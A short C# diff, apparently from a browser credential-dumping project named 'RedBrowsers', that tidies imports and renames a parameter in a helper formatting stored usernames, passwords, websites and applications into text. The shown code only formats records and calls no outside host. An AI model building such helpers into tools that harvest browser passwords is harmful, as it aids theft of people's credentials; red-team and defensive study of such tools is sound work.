@@ -2,11 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Reflection;
-using System.Text;
-using System.Threading.Tasks;
-
 namespace RedBrowsers.Utlis
 {
     class Utlis
@@ -43,10 +39,10 @@ namespace RedBrowsers.Utlis
                 CreateRows(list, sw);
             }
         }
-        public static string CreateString(List<Account> a) 
+        public static string CreateString(List<Account> Accounts) 
         {
             string ret =string.Empty;
-            foreach (Account account in a)
+            foreach (Account account in Accounts)
             {
                 ret += $"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
             }
